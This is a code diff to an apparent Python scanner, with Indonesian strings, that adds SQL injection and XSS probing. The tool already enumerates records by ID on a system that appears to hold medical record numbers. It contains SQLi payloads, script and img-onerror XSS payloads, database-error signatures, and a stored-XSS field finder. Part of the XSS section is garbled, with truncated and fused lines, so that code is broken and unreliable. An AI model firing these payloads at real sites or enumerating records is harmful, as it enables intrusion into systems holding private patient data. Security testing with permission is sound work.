@@ -224,6 +224,72 @@ def parameter_discovery_audit():
     except Exception as e:
         print(f"[!] Discovery Error: {str(e)}")
 
+def vulnerability_audit():
+    print("[*] Initiating Vulnerability Scan: SQL Injection & XSS...")
+    target_id = input("[?] Masukkan 1 No RM contoh untuk testing (ex: 502013): ")
+    if not target_id: return
+
+    base_url = BASE_TARGET_URL + target_id
+    
+    # --- 1. SQL Injection Testing ---
+    print("\n[+] Testing for SQL Injection (Error-Based)...")
+    sqli_payloads = ["'", "''", "1' OR '1'='1", "1\" OR \"1\"=\"1"]
+    sql_errors = [
+        "SQL syntax", "mysql_fetch", "nativeclient", "ORA-01756", 
+        "SQLite3::query", "PostgreSQL query failed", "Database Error"
+    ]
+    
+    for payload in sqli_payloads:
+        test_url = base_url + payload
+        try:
+            res = session.get(test_url, timeout=10)
+            found_error = any(error.lower() in res.text.lower() for error in sql_errors)
+            
+            if found_error:
+                print(f" [\033[91m!\033[0m] SQLi Potential Detected with payload: {payload}")
+                print(f"     Status: \033[91mCRITICAL - Database Error Exposed\033[0m")
+                break
+        except: pass
+    else:
+        print(" [\033[92m✓\033[0m] Error-Based SQLi: No obvious error patterns found.")
+
+    # --- 2. Reflected XSS Testing ---
+    print("\n[+] Testing for Reflected XSS...")
+    xss_payloads = [
+        "<script>alert('XSS')</script>",
+        "\"><script>alert(1)</script>",
+        "<img src=x onerror=alert(1)>"
+    ]
+    
+    # Encode URL Riwayat Pemeriksaan untuk pencarian
+    se
+    for payload in xss_payloads:
+        test_url = search_endpoint + payload
+        try:=10)
+            if paylnt(f" [\033[91m!\033[0m] Reflected XSS Detected!")
+                print(f"     Payload: {payload}")
+                print(f"     Status : \033[91mVULNERABLE - Input reflected without encoding\033[0m")
+                break
+        except: pass
+        print(" [\033[92m✓\033[0m] Reflected XSS: Input properly sanitized or encoded.")
+
+    # --- 3. Stored XSS Probe ---
+    print("\n[+] Probing for Stored XSS Surfaces...")
+    try:
+        res = session.get(base_url, timeout=10)
+        soup = BeautifulSoup(res.text, 'html.parser')
+        forms = soup.find_all('form')
+        if forms:m(s) on reservation page.")
+            for form in forms:
+                inputs = form.find_all(['input', 'textarea'])
+                for i in inputs:
+                    name = i.get('name', 'unnamed')
+                    if i.name == 'textarea' or i.get('type') == 'text':
+                        print(f"     [\033[93m!\033[0m] Target Field: {name} (Potential Stored XSS Vector)")
+        else:
+            print(" [!] No input forms discovered for stored testing.")
+    except: pass
+
 def start_process(start_range, end_range):
     if login():
         print(f"[*] Starting IDOR Scan for {end_range - start_range + 1} records...\n")
@@ -239,6 +305,7 @@ def main_menu():
         print(" [2] IDOR Scan (Input Jumlah Data)")
         print(" [3] Security Config Audit (Headers & Files)")
         print(" [4] Parameter Discovery (URL Tampering Scan)")
+        print(" [5] Vulnerability Scan (SQLi & XSS Testing)")
         print(" [0] Exit")
         print("\n")
         
@@ -263,6 +330,10 @@ def main_menu():
         elif choice == '4':
             if login():
                 parameter_discovery_audit()
+            input("\nTekan Enter untuk kembali ke menu...")
+        elif choice == '5':
+            if login():
+                vulnerability_audit()
             input("\nTekan Enter untuk kembali ke menu...")
         elif choice == '0':
             print("Happy Auditing!")
